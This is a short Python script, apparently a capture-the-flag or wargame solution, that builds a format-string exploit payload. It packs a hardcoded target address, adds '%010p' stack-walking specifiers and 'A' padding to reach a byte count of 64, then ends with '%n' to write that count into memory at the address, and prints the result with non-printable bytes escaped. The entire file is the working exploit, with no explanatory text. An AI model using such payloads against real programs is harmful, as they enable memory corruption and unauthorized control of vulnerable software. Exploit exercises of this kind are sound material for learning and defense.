#!/usr/bin/env python3

from struct import pack

def p(x): return pack('<I', x)
def isprint(c): return c >= 0x20 and c <= 0x7e

total_length = 64

m_address = p(0x0804988c)
payload = m_address
total_length -= len(payload)
payload += b"%010p" * 3
total_length -= 10 * 3
payload += total_length * b"A"
payload += b"%n"

for c in payload:
    if isprint(c):
        print(chr(c), end="")
    else:
        print("\\x%02x" % c, end="")
